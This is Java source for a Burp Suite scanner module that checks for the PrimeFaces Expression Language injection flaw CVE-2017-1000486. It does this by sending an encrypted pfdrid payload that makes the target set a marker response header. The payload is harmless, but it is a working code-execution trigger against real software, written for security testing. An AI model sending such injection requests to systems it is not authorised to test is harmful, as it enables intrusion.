package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.getApplicationContext;
import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

/**
 * PrimeFaces Expression Language Injection
 *
 *
 * References: 
 * - http://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html
 * - https://github.com/primefaces/primefaces/issues/1152 - CVE-2017-1000486
 * - https://www.exploit-db.com/exploits/43733
 *
 *
 * TODO - Improve basic dummy detection of Primefaces EL Injection
 *
 */
public class PrimeFacesELInjection implements IModule {

    private static final String TITLE = "PrimeFaces Expression Language Injection - CVE-2017-1000486";
    private static final String DESCRIPTION = "The remote PrimeFaces library is vulnerable to <i>PrimeOracle</i> and"
            + " <i>PrimeSecret<i/> vulnerabilities.<br /> "
            + "Primefaces versions prior to 5.2.21, 5.3.8 or 6.0 are vulnerable to a padding oracle attack, due to the use of weak crypto and default encryption password and salt"
            + "Due to the nature of the vulnerability, this check executed the following EL payload to set a custom response header in the HTTP response<br /><br />"
            + "<pre>"
            + "${facesContext.getExternalContext().setResponseHeader(\\\"J2EESCANPRIME\\\",\\\"primefaces\\\")}"
            + "</pre>"
            + "<br/><br/>"
            + "<b>References</b>:<br /><br />"
            + "https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html<br />"
            + "https://github.com/primefaces/primefaces/issues/1152<br />"
            + "https://www.illucit.com/en/java-ee/primefaces-expression-language-remote-code-execution-fix/<br />"
            + "https://www.exploit-db.com/exploits/43733";

    private static final String REMEDY = "Update the remote PrimeFaces library. ";
    // "${facesContext.getExternalContext().setResponseHeader(\"J2EESCANPRIME\",\"primefaces\")}"
    private static final String INJ_TEST = "uMKljPgnOTVxmOB%2bH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVYjEh7SE3F4WmfKUle6apy2QGwABuVlzurPsgFxYP0G3b1dDqmgmxMw%3d%3d";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();
    // List of host port and context already tested
    private static LinkedHashSet hsc = new LinkedHashSet();

    private PrintWriter stderr;
    private PrintWriter stdout;

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        List<IScanIssue> issues = new ArrayList<>();

        List<String> PAYLOADS = new ArrayList<>();
        PAYLOADS.add("/javax.faces.resource/j2eescan.xhtml?pfdrt=sc&ln=primefaces&pfdrid=" + PrimeFacesELInjection.INJ_TEST);
        PAYLOADS.add("/javax.faces.resource/j2eescan.jsf?pfdrt=sc&ln=primefaces&pfdrid=" + PrimeFacesELInjection.INJ_TEST);

        if (!isJavaApplicationByURL(url)) {
            return issues;
        }

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {
            hs.add(system);

            String protocol = url.getProtocol();
            Boolean isSSL = (protocol.equals("https"));

            for (String PAYLOAD : PAYLOADS) {

                URL jsfURIToTest;
                try {
                    jsfURIToTest = new URL(protocol, url.getHost(), url.getPort(), PAYLOAD);
                    byte[] jsfRequestHTTP = helpers.buildHttpRequest(jsfURIToTest);
                    byte[] browserResponse = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, jsfRequestHTTP);
                    IResponseInfo modifiedResponseInfo = helpers.analyzeResponse(browserResponse);

                    // check the injected HTTP header  
                    for (String header : modifiedResponseInfo.getHeaders()) {

                        if (header.contains("J2EESCANPRIME")) {

                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    jsfURIToTest,
                                    new CustomHttpRequestResponse(jsfRequestHTTP, browserResponse, baseRequestResponse.getHttpService()),
                                    TITLE,
                                    DESCRIPTION,
                                    REMEDY,
                                    Risk.High,
                                    Confidence.Certain));
                        }
                    }

                } catch (MalformedURLException ex) {
                    stderr.println("Malformed URL Exception " + ex);
                }

            }

        }

        /**
         * Test on the application context
         *
         * Ex: http://www.example.com/myapp/Login
         *
         * Retrieve the myapp context and test the issue
         *
         * Ex: http://www.example.com/myapp/manage/env
         */
        String context = getApplicationContext(url);

        if (context.isEmpty()) {
            return issues;
        }

        String contextURI = system + context;

        if (!hsc.contains(contextURI)) {
            hsc.add(contextURI);
            String protocol = url.getProtocol();
            Boolean isSSL = (protocol.equals("https"));

            for (String PAYLOAD : PAYLOADS) {

                URL jsfURIToTest;
                try {
                    jsfURIToTest = new URL(protocol, url.getHost(), url.getPort(), context + PAYLOAD);
                    byte[] jsfRequestHTTP = helpers.buildHttpRequest(jsfURIToTest);
                    byte[] browserResponse = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, jsfRequestHTTP);
                    IResponseInfo modifiedResponseInfo = helpers.analyzeResponse(browserResponse);

                    // check the injected HTTP header  
                    for (String header : modifiedResponseInfo.getHeaders()) {

                        if (header.contains("J2EESCANPRIME")) {

                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    jsfURIToTest,
                                    new CustomHttpRequestResponse(jsfRequestHTTP, browserResponse, baseRequestResponse.getHttpService()),
                                    TITLE,
                                    DESCRIPTION,
                                    REMEDY,
                                    Risk.High,
                                    Confidence.Certain));
                        }
                    }

                } catch (MalformedURLException ex) {
                    stderr.println("Malformed URL Exception " + ex);
                }

            }

        }

        return issues;
    }
}
